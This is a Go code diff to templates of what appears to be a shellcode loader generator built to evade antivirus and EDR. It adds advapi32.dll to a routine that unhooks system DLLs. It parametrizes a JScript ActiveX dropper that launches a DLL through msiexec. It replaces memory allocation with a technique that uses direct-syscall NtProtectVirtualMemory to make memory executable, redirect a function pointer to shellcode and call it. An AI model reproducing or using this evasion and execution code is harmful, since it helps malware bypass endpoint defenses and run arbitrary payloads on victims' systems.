@@ -196,7 +196,7 @@ func JS_Control_Sub() string {
 func JS_Msiexec_Sub() string {
 	return `
 	var {{.Variables.objShell}} = new ActiveXObject("she"+"ll.appl"+"ication");     
-    {{.Variables.objShell}}.ShellExecute("C:\\Windows\\Sysnative\\msiexec.exe", "/z "+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", 1);
+    {{.Variables.objShell}}.ShellExecute("C:\\Windows\\{{.Variables.System32}}\\msiexec.exe", "/z "+{{.Variables.dropPath}}+"\\{{.Variables.FileName}}{{.Variables.dllext}}", "", "", 1);
 	`
 }
 
@@ -367,6 +367,9 @@ func DLL_Refresher() string {
 		if err != nil {
 		}
 		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'k', 'e', 'r', 'n', 'e', 'l', 'b', 'a', 's', 'e', '.', 'd', 'l', 'l'}))
+		if err != nil {
+		}
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}))
 		if err != nil {
 		}
 		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
@@ -571,6 +574,10 @@ func Binary() string {
 		if err != nil {
 			{{.Variables.RefreshPE}}
 		}
+		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l'}))
+		if err != nil {
+			{{.Variables.RefreshPE}}
+		}
 		err = {{.Variables.Reloading}}(string([]byte{'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l'}))
 		if err != nil {
 			{{.Variables.RefreshPE}}
@@ -594,19 +601,41 @@ func Binary() string {
 		{{.Variables.Pointer}}
 		{{.Variables.raw_bin}} := [loader].{{.Variables.FuncName}}()
 		{{.Variables.ShellcodeString}}
-		var {{.Variables.phandle}} uint64
-		var {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.alloctype}}, {{.Variables.protect}} uintptr
-		{{.Variables.phandle}} = 0xffffffffffffffff
-		{{.Variables.regionsizep}} := len({{.Variables.raw_bin}})
-		{{.Variables.regionsize}} := uintptr({{.Variables.regionsizep}})
-		{{.Variables.protect}} = 0x40
-		{{.Variables.alloctype}} = 0x3000
-		{{.Variables.ptr}} := [loader].[Allocate]({{.Variables.customsyscall}}, {{.Variables.phandle}}, {{.Variables.baseA}}, {{.Variables.zerob}}, {{.Variables.regionsize}}, {{.Variables.alloctype}}, {{.Variables.protect}}, 0)
-		{{.Variables.buff}}  := (*[1890000]byte)(unsafe.Pointer({{.Variables.ptr}}))
-		for x, y := range []byte({{.Variables.raw_bin}}) {
-			{{.Variables.buff}} [x] = y
+		{{.Variables.ptr}} := func() {
 		}
-		syscall.Syscall({{.Variables.ptr}}, 0, 0, 0, 0,)
+		var {{.Variables.oldptrperms}} uintptr
+		{{.Variables.handle}} := uintptr(0xffffffffffffffff)
+		{{.Variables.regionsize}} := uintptr(len({{.Variables.raw_bin}}))
+		var {{.Variables.oldfartcodeperms}} uintptr
+		{{.Variables.runfunc}}, _ := [loader].[NtProtectVirtualMemoryprep](
+			{{.Variables.customsyscallVP}}, 
+			{{.Variables.handle}},
+			(*uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),
+			&{{.Variables.regionsize}},
+			0x40,
+			&{{.Variables.oldptrperms}},
+		)
+		if {{.Variables.runfunc}} != 0 {
+			panic("Call to VirtualProtect failed!")
+		}
+		{{.Variables.CopyPointer}}
+		*(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})) = (*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}}))
+		{{.Variables.OverwrittenShellcode}}
+	
+		{{.Variables.OverWrittenPoint}}
+		{{.Variables.runfunc}}, _ = [loader].[NtProtectVirtualMemoryprep](
+			{{.Variables.customsyscallVP}}, 
+			{{.Variables.handle}},
+			(*uintptr)(unsafe.Pointer(&{{.Variables.raw_bin}})),
+			&{{.Variables.regionsize}},
+			0x40,
+			&{{.Variables.oldfartcodeperms}},
+		)
+		if {{.Variables.runfunc}} != 0 {
+			panic("Call to VirtualProtect failed!!!!!")
+		}
+		syscall.Syscall(**(**uintptr)(unsafe.Pointer(&{{.Variables.ptr}})),0, 0, 0, 0,)
+
 	
 	}
 	func {{.Variables.Reloading}}({{.Variables.DLLname}} string) error {
